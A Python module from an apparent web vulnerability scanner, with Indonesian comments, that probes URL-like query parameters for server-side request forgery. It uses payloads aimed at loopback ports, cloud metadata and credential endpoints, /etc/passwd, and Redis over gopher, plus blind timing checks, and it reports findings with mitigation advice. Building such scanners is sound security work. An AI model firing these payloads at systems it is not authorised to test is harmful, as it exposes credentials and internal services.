"""
A10:2025 - Mishandling of Exceptional Conditions (SSRF)
Refactored: Split direct-signature vs blind-timing payloads.
Only test URL-like params or max 3 params if no URL param.
"""
import asyncio
import time
from urllib.parse import urlparse, parse_qs, urlencode


CATEGORY = "A10:2025 - Mishandling of Exceptional Conditions"

# ==========================================
# DIRECT SSRF PAYLOADS (signature-based)
# Response dari server akan mengandung signature khas
# ==========================================
SSRF_DIRECT_PAYLOADS = [
    # Loopback
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://127.0.0.1:22",
    "http://[::1]:80",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    # File scheme
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    # Gopher
    "gopher://127.0.0.1:6379/_INFO",
]

SSRF_SIGNATURES = [
    "root:x:0:0",
    "ami-id", "instance-id", "iam/security-credentials",
    "for 16-bit app support",
    "computeMetadata",
    "redis_version",
    "SSH-2.0", "OpenSSH",
]

# ==========================================
# BLIND SSRF PAYLOADS (timing-based)
# Non-routable / blackhole IP — packet dropped
# ==========================================
SSRF_BLIND_PAYLOADS = [
    "http://10.255.255.1:81/",      # RFC1918 — packet dropped
    "http://192.0.2.1:8080/",       # TEST-NET-1 — non-routable
    "http://198.51.100.1:80/",      # TEST-NET-2 — non-routable
]

# ==========================================
# PARAMETER KEYWORDS (untuk filter agresif)
# Hanya test parameter yang namanya mengandung keyword ini
# ==========================================
URL_PARAM_KEYWORDS = [
    "url", "uri", "redirect", "target", "dest",
    "src", "feed", "webhook", "callback", "link",
    "next", "return", "goto", "image", "proxy",
    "fetch", "path", "file", "host", "domain",
]

# Batas maksimal parameter jika tidak ada URL-like param
MAX_PARAMS_IF_NO_MATCH = 3

# Blind SSRF: timeout 5 detik untuk deteksi drop packet
BLIND_TIMEOUT = 5


# ==========================================
# HELPERS
# ==========================================
def _inject(url, param, payload):
    p = urlparse(url)
    q = parse_qs(p.query)
    q[param] = [payload]
    return f"{p.scheme}://{p.netloc}{p.path}?{urlencode(q, doseq=True)}"


def _filter_url_params(all_params):
    """
    Filter parameter: hanya yang mengandung URL_PARAM_KEYWORDS.
    Kalau tidak ada, ambil MAX_PARAMS_IF_NO_MATCH pertama.
    """
    if not all_params:
        return []

    url_like = [p for p in all_params if any(kw in p.lower() for kw in URL_PARAM_KEYWORDS)]

    if url_like:
        return url_like

    # Fallback: max N parameter
    return all_params[:MAX_PARAMS_IF_NO_MATCH]


# ==========================================
# MAIN SCAN
# ==========================================
async def _run_async(scanner):
    # Ambil parameter dari URL target
    params_from_url = list(parse_qs(urlparse(scanner.target).query).keys())

    # Filter ke URL-like parameter saja
    params = _filter_url_params(params_from_url)

    if not params:
        scanner.add_finding(
            CATEGORY, "SAFE",
            "Tidak ada parameter URL-like untuk diuji SSRF",
        )
        return

    # ==========================================
    # PHASE 1: Direct SSRF (signature-based)
    # ==========================================
    tasks = []
    meta = []
    for param in params:
        for payload in SSRF_DIRECT_PAYLOADS:
            url = _inject(scanner.target, param, payload)
            tasks.append(scanner.aget(url))
            meta.append((param, payload))

    if tasks:
        results = await scanner.agather(tasks)
        for (param, payload), r in zip(meta, results):
            if not isinstance(r, dict):
                continue
            body = r.get("body", "")
            for sig in SSRF_SIGNATURES:
                if sig in body:
                    scanner.add_finding(
                        CATEGORY, "HIGH",
                        f"Parameter '{param}' rentan SSRF (direct signature)",
                        mitigation="Whitelist URL/domain. Blokir IP internal & cloud metadata. Validasi protocol.",
                        evidence=f"Payload: {payload} | Signature: {sig}",
                    )
                    return

    # ==========================================
    # PHASE 2: Blind SSRF (timing-based)
    # Gunakan blackhole IP + timeout 5 detik
    # ==========================================
    # Ambil baseline timing
    t0 = time.perf_counter()
    r = await scanner.aget(scanner.target)
    baseline = time.perf_counter() - t0 if r else 0

    for param in params[:3]:  # Batasi max 3 param
        for payload in SSRF_BLIND_PAYLOADS:
            url = _inject(scanner.target, param, payload)
            t0 = time.perf_counter()
            await scanner.aget(url)
            elapsed = time.perf_counter() - t0

            # Deteksi delay signifikan: > 3× baseline DAN > BLIND_TIMEOUT
            if elapsed > max(baseline * 3, BLIND_TIMEOUT):
                scanner.add_finding(
                    CATEGORY, "MEDIUM",
                    f"Parameter '{param}' potensi blind SSRF (delay {elapsed:.2f}s)",
                    mitigation="Blokir request ke IP internal di server-side. Rate limit outbound request.",
                    evidence=f"Payload: {payload} | Baseline: {baseline:.2f}s | Payload: {elapsed:.2f}s",
                )
                return

    scanner.add_finding(CATEGORY, "SAFE", "Tidak ada SSRF terdeteksi")


def scan(scanner):
    """Entry point — dipanggil dari cli.py."""
    try:
        asyncio.run(_run_async(scanner))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(_run_async(scanner))
    except Exception as e:
        scanner.add_finding(CATEGORY, "INFO", f"Error: {e}")